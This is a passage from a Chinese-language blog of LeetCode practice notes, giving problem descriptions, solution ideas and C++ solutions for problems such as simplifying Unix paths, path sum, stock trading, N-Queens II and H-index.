class="keyword">while</span>(j&lt;nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j]!=val)<span class="built_in">swap</span>(nums[j],nums[i++]);</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="简化路径中等">简化路径（中等）</h2><h3 id="题目描述-3">题目描述</h3><p>给你一个字符串 <code>path</code> ，表示指向某一文件或目录的 Unix 风格<strong>绝对路径</strong> （以 <code>'/'</code>开头），请你将其转化为更加简洁的规范路径。</p><p>在 Unix风格的文件系统中，一个点（<code>.</code>）表示当前目录本身；此外，两个点（<code>..</code>）表示将目录切换到上一级（指向父目录）；两者都可以是复杂相对路径的组成部分。任意多个连续的斜杠（即，<code>'//'</code>）都被视为单个斜杠<code>'/'</code> 。对于此问题，任何其他格式的点（例如，<code>'...'</code>）均被视为文件/目录名称。</p><p>请注意，返回的 <strong>规范路径</strong> 必须遵循下述格式：</p><ul><li>始终以斜杠 <code>'/'</code> 开头。</li><li>两个目录名之间必须只有一个斜杠 <code>'/'</code> 。</li><li>最后一个目录名（如果存在）<strong>不能</strong> 以 <code>'/'</code>结尾。</li><li>此外，路径仅包含从根目录到目标文件或目录的路径上的目录（即，不含<code>'.'</code> 或 <code>'..'</code>）。</li></ul><p>返回简化后得到的 <strong>规范路径</strong> 。</p><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：path = &quot;/home/&quot;</span><br><span class="line">输出：&quot;/home&quot;</span><br><span class="line">解释：注意，最后一个目录名后面没有斜杠。 </span><br></pre></td></tr></table></figure><h3 id="思路-3">思路</h3><p>用堆栈，遇到<code>..</code>就pop，遇到<code>.</code>就跳过</p><h3 id="代码-3">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">simplifyPath</span><span class="params">(string path)</span> </span>&#123;</span><br><span class="line">        stack&lt;string&gt;stk;</span><br><span class="line">        string pushing;</span><br><span class="line">        <span class="keyword">while</span>(path[<span class="number">0</span>]==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">            path=path.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!path.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">while</span>(!path.<span class="built_in">empty</span>()&amp;&amp;path[<span class="number">0</span>]!=<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                pushing.<span class="built_in">push_back</span>(path[<span class="number">0</span>]);</span><br><span class="line">                path=path.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(stk.<span class="built_in">empty</span>()&amp;&amp;pushing!=<span class="string">&quot;.&quot;</span>&amp;&amp;pushing!=<span class="string">&quot;..&quot;</span>)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(pushing);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span>(pushing==<span class="string">&quot;..&quot;</span>)&#123;</span><br><span class="line">                    stk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pushing!=<span class="string">&quot;.&quot;</span>)&#123;</span><br><span class="line">                    stk.<span class="built_in">push</span>(pushing);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pushing=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(!path.<span class="built_in">empty</span>()&amp;&amp;path[<span class="number">0</span>]==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                path=path.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            pushing=<span class="string">&quot;/&quot;</span>+stk.<span class="built_in">top</span>()+pushing;</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pushing==<span class="string">&quot;&quot;</span>?<span class="string">&quot;/&quot;</span>:pushing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="路径总和简单">路径总和（简单）</h2><h3 id="题目描述-4">题目描述</h3><p>给你二叉树的根节点 <code>root</code> 和一个表示目标和的整数<code>targetSum</code> 。判断该树中是否存在<strong>根节点到叶子节点</strong>的路径，这条路径上所有节点值相加等于目标和 <code>targetSum</code>。如果存在，返回 <code>true</code> ；否则，返回 <code>false</code>。</p><p><strong>叶子节点</strong> 是指没有子节点的节点。</p><p><strong>示例 1：</strong></p><figure><img src="/post/4d65bd11/pathsum1.jpg" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：root = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22</span><br><span class="line">输出：true</span><br><span class="line">解释：等于目标和的根节点到叶节点路径如上图所示。</span><br></pre></td></tr></table></figure><h3 id="思路-4">思路</h3><p>很简单的回溯</p><h3 id="代码-4">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="type">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        targetSum-=root-&gt;val;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span>&amp;&amp;root-&gt;right==<span class="literal">NULL</span>)<span class="keyword">return</span> targetSum==<span class="number">0</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hasPathSum</span>(root-&gt;left,targetSum)||<span class="built_in">hasPathSum</span>(root-&gt;right,targetSum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="删除有序数组中的重复项ⅱ中等">删除有序数组中的重复项Ⅱ（中等）</h2><h3 id="题目描述-5">题目描述</h3><p>给你一个有序数组 <code>nums</code> ，请你<strong><a href="http://baike.baidu.com/item/原地算法">原地</a></strong>删除重复出现的元素，使得出现次数超过两次的元素<strong>只出现两次</strong>，返回删除后数组的新长度。</p><p>不要使用额外的数组空间，你必须在 <strong><a href="https://baike.baidu.com/item/原地算法">原地</a>修改输入数组</strong>并在使用 O(1) 额外空间的条件下完成。</p><h3 id="思路-5">思路</h3><p>i从位置0开始，j从位置1开始</p><p>分为三个阶段做：</p><ol type="1"><li>如果i位置的值和j位置的值第一次相等，i和j直接加一（如果i和j不相连的话需要将j位置的值给i+1位置的值），因为需要保留出现超过两次的元素出现两次</li><li>接着进行比较，如果i和j位置还是相等只加j，就代表该值不要，因为之需要保留两次</li><li>遇到不相等的时候，先将j的值赋给i+1，再对i和j进行加1</li></ol><h3 id="代码-5">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">removeDuplicates</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[j]==nums[i])</span><br><span class="line">                <span class="keyword">if</span>(++i!=j++)<span class="built_in">swap</span>(nums[j<span class="number">-1</span>],nums[i]);</span><br><span class="line">            <span class="keyword">while</span>(j&lt;length&amp;&amp;nums[j]==nums[i])j++;</span><br><span class="line">            <span class="keyword">if</span>(j&lt;length)<span class="built_in">swap</span>(nums[j++],nums[++i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="买卖股票的最佳时机ⅱ中等">买卖股票的最佳时机Ⅱ（中等）</h2><h3 id="题目描述-6">题目描述</h3><p>给你一个整数数组 <code>prices</code> ，其中 <code>prices[i]</code>表示某支股票第 <code>i</code> 天的价格。</p><p>在每一天，你可以决定是否购买和/或出售股票。你在任何时候<strong>最多</strong> 只能持有 <strong>一股</strong>股票。你也可以先购买，然后在 <strong>同一天</strong> 出售。</p><p>返回 <em>你能获得的 <strong>最大</strong> 利润</em> 。</p><h3 id="思路动态规划">思路：动态规划</h3><p>其实相当于买股票就是减钱，卖股票就是加钱，只能先买股票再卖股票，对于每一个时间点，如果前一个时间点有股票，那么该时间点就可以选择留股票或者卖股票，这里没办法通过直接判断该时间点留股票赚钱多还是卖股票赚钱多，所以需要为每个时间点维护两个状态，一个状态用于存储该时间点不留股票，也就是如果该时间点的前一个时间点有股票就卖掉，没有就保持，取二者最大值为该股票能得到的最大现金数，另一个状态用于存储该时间点留股票，也就是如果前一个时间点有股票就保持，没有就买当前时间点的股票，取二者较大值作为该时间点留股票可达到的最大数目金额</p><p>买股票就相当于现金减去当前买的股票金额，卖股票就相当于现金加上当前股票金额</p><p>用<code>dp[i][0]</code>代表该时间点不留股票能达到的最大金额，用<code>dp[i][1]</code>来表示该时间点留股票能达到的最大金额，状态更新方程就为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp[i][0]=max(dp[i-1][0],dp[i-1][1]+price[i]);</span><br><span class="line">dp[i][1]=max(dp[i-1][1],dp[i-1][0]-price[i]);</span><br></pre></td></tr></table></figure><h3 id="代码-6">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length=prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;<span class="built_in">dp</span>(length,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;length;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i]);</span><br><span class="line">            dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[length<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="用最少数量的箭引爆气球中等">用最少数量的箭引爆气球（中等）</h2><h3 id="题目描述-7">题目描述</h3><p>有一些球形气球贴在一堵用 XY平面表示的墙面上。墙面上的气球记录在整数数组 <code>points</code>，其中<code>points[i] = [xstart, xend]</code> 表示水平直径在<code>xstart</code> 和 <code>xend</code>之间的气球。你不知道气球的确切 y坐标。</p><p>一支弓箭可以沿着 x 轴从不同点 <strong>完全垂直</strong>地射出。在坐标 <code>x</code>处射出一支箭，若有一个气球的直径的开始和结束坐标为<code>x``start</code>，<code>x``end</code>， 且满足<code>xstart ≤ x ≤ x``end</code>，则该气球会被 <strong>引爆</strong>。可以射出的弓箭的数量 <strong>没有限制</strong> 。弓箭一旦被射出之后，可以无限地前进。</p><p>给你一个数组 <code>points</code> ，<em>返回引爆所有气球所必须射出的<strong>最小</strong> 弓箭数</em> 。</p><h3 id="思路-6">思路</h3><p>先对points进行排序，然后从头开始确定能一次性引爆的气球数，用start，end表示能通过在该范围进行射箭引爆以遍历的气球，如果遇到有气球超过了end，那该气球就没办法一次性引爆，如果有气球没超过end，但是提前结束了，end需要往前移以便能引爆该气球</p><h3 id="代码-7">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMinArrowShots</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(points.<span class="built_in">begin</span>(),points.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> start;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;points.<span class="built_in">size</span>())&#123;</span><br><span class="line">            start=INT_MIN;</span><br><span class="line">            end=INT_MAX;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;points.<span class="built_in">size</span>()&amp;&amp;points[i][<span class="number">0</span>]&lt;=end)&#123;</span><br><span class="line">                start=points[i][<span class="number">0</span>];</span><br><span class="line">                end=<span class="built_in">min</span>(points[i][<span class="number">1</span>],end);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="汇总区间简单">汇总区间（简单）</h2><h3 id="题目描述-8">题目描述</h3><p>给定一个 <strong>无重复元素</strong> 的 <strong>有序</strong>整数数组 <code>nums</code> 。</p><p>返回 <em><strong>恰好覆盖数组中所有数字</strong> 的<strong>最小有序</strong> 区间范围列表</em>。也就是说，<code>nums</code>的每个元素都恰好被某个区间范围所覆盖，并且不存在属于某个范围但不属于<code>nums</code> 的数字 <code>x</code> 。</p><p>列表中的每个区间范围 <code>[a,b]</code> 应该按如下格式输出：</p><ul><li><code>"a-&gt;b"</code> ，如果 <code>a != b</code></li><li><code>"a"</code> ，如果 <code>a == b</code></li></ul><h3 id="知识点">知识点</h3><ol type="1"><li><p>数字转换成字符串：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strNum=<span class="built_in">to_string</span>(num);</span><br></pre></td></tr></table></figure></li></ol><h3 id="思路-7">思路</h3><p>也就是获取连续数字的头和尾，以此遍历即可</p><h3 id="代码-8">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">summaryRanges</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> end=<span class="number">0</span>;</span><br><span class="line">        vector&lt;string&gt;ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            start=nums[i];</span><br><span class="line">            <span class="keyword">while</span>(i&lt;nums.<span class="built_in">size</span>()<span class="number">-1</span>&amp;&amp;nums[i+<span class="number">1</span>]==nums[i]+<span class="number">1</span>)&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            end=nums[i];</span><br><span class="line">            <span class="keyword">if</span>(start==end)ans.<span class="built_in">push_back</span>(<span class="built_in">to_string</span>(start));</span><br><span class="line">            <span class="keyword">else</span> ans.<span class="built_in">push_back</span>(<span class="built_in">to_string</span>(start)+<span class="string">&quot;-&gt;&quot;</span>+<span class="built_in">to_string</span>(end));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="n皇后ⅱ困难">N皇后Ⅱ（困难）</h2><h3 id="题目描述-9">题目描述</h3><p><strong>n 皇后问题</strong> 研究的是如何将 <code>n</code>个皇后放置在 <code>n × n</code>的棋盘上，并且使皇后彼此之间不能相互攻击。</p><p>给你一个整数 <code>n</code> ，返回 <strong>n 皇后问题</strong>不同的解决方案的数量。</p><h3 id="知识点-1">知识点</h3><p><code>std::unordered_set</code> 是 C++标准库提供的一个无序集合容器，它基于哈希表实现，允许快速的插入、删除和查找操作。这个容器不会按特定顺序来存储元素，而是按照哈希函数计算的位置进行存储，因此元素的顺序是不确定的。</p><p>以下是 <code>std::unordered_set</code> 的一些常用方法和使用方法：</p><ol type="1"><li><strong>插入元素</strong>：<ul><li><code>insert(val)</code>: 向集合中插入一个元素<code>val</code>。</li></ul></li><li><strong>删除元素</strong>：<ul><li><code>erase(val)</code>: 从集合中移除值为 <code>val</code>的元素。</li><li><code>clear()</code>: 清空集合，移除所有元素。</li></ul></li><li><strong>查找元素</strong>：<ul><li><code>find(val)</code>: 查找值为 <code>val</code>的元素，返回指向该元素的迭代器；如果不存在，则返回集合尾后迭代器（<code>end()</code>）。</li></ul></li><li><strong>大小和容量</strong>：<ul><li><code>size()</code>: 返回集合中元素的数量。</li><li><code>empty()</code>: 检查集合是否为空。</li></ul></li><li><strong>迭代器</strong>：<ul><li><code>begin()</code>, <code>end()</code>:返回指向集合第一个元素和尾后的迭代器，用于遍历集合的元素。</li></ul></li></ol><h3 id="思路-8">思路</h3><p>和之前的N皇后思路几乎一样，不做过多解释了</p><h3 id="代码-9">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">putQueens</span><span class="params">(<span class="type">int</span>&amp; remainN,unordered_set&lt;<span class="type">int</span>&gt;duijiaoLeft,unordered_set&lt;<span class="type">int</span>&gt;duijiaoRight,unordered_set&lt;<span class="type">int</span>&gt;visited,<span class="type">int</span>&amp; n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(remainN==<span class="number">0</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; modifiedSet;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; item : duijiaoLeft) &#123;</span><br><span class="line">            modifiedSet.<span class="built_in">insert</span>(item - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        duijiaoLeft.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; item : modifiedSet) &#123;</span><br><span class="line">            duijiaoLeft.<span class="built_in">insert</span>(item);</span><br><span class="line">        &#125;</span><br><span class="line">        modifiedSet.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; item : duijiaoRight) &#123;</span><br><span class="line">            modifiedSet.<span class="built_in">insert</span>(item + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        duijiaoRight.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; item : modifiedSet) &#123;</span><br><span class="line">            duijiaoRight.<span class="built_in">insert</span>(item);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(duijiaoLeft.<span class="built_in">find</span>(i)==duijiaoLeft.<span class="built_in">end</span>()&amp;&amp;duijiaoRight.<span class="built_in">find</span>(i)==duijiaoRight.<span class="built_in">end</span>()&amp;&amp;visited.<span class="built_in">find</span>(i)==visited.<span class="built_in">end</span>())&#123;</span><br><span class="line">                duijiaoLeft.<span class="built_in">insert</span>(i);</span><br><span class="line">                duijiaoRight.<span class="built_in">insert</span>(i);</span><br><span class="line">                visited.<span class="built_in">insert</span>(i);</span><br><span class="line">                <span class="built_in">putQueens</span>(--remainN,duijiaoLeft,duijiaoRight,visited,n);</span><br><span class="line">                visited.<span class="built_in">erase</span>(i);</span><br><span class="line">                duijiaoLeft.<span class="built_in">erase</span>(i);</span><br><span class="line">                duijiaoRight.<span class="built_in">erase</span>(i);</span><br><span class="line">                remainN++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">totalNQueens</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt;duijiaoLeft;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt;duijiaoRight;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt;visited;</span><br><span class="line">        <span class="type">int</span> remainN=n;</span><br><span class="line">        <span class="built_in">putQueens</span>(remainN,duijiaoLeft,duijiaoRight,visited,n);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="h指数中等">H指数（中等）</h2><h3 id="题目描述-10">题目描述</h3><p>给你一个整数数组 <code>citations</code> ，其中<code>citations[i]</code> 表示研究者的第 <code>i</code>篇论文被引用的次数。计算并返回该研究者的 <strong><code>h</code>指数</strong>。</p><p>根据维基百科上 <a href="https://baike.baidu.com/item/h-index/3991452?fr=aladdin">h指数的定义</a>：<code>h</code> 代表“高引用次数” ，一名科研人员的<code>h</code> <strong>指数</strong> 是指他（她）至少发表了<code>h</code> 篇论文，并且每篇论文 <strong>至少</strong> 被引用<code>h</code> 次。如果 <code>h</code>有多种可能的值，<strong><code>h</code> 指数</strong>是其中最大的那个。</p><h3 id="思路-9">思路</h3><p>先对原数组进行排序，我们要找最大值的h就是要满足大于等于h的数大于等于h，所以排序之后我们可以知道大于每个数的数有多少，进行查找最大值即可</p><h3 id="代码-10">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">hIndex</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; citations)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(citations.<span class="built_in">begin</span>(),citations.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;citations.<span class="built_in">size</span>();i++)</span><br><span class="line">            <span class="keyword">if</span>(citations[i]&gt;=(citations.<span class="built_in">size</span>()-i))<span class="keyword">return</span> citations.<span class="built_in">size</span>()-i;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="加一简单">加一（简单）</h2><h3 id="题目描述-11">题目描述</h3><p>给定一个由 <strong>整数</strong> 组成的 <strong>非空</strong>数组所表示的非负整数，在该数的基础上加一。</p><p>最高位数字存放在数组的首位，数组中每个元素只存储<strong>单个</strong>数字。</p><p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p><h3 id="思路-10">思路</h3><p>从后往前加，如果遇到加了小于10的直接返回，如果所有都大于等于10，则第一位肯定是1，后面肯定是0</p><h3 id="代码-11">代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=digits.<span 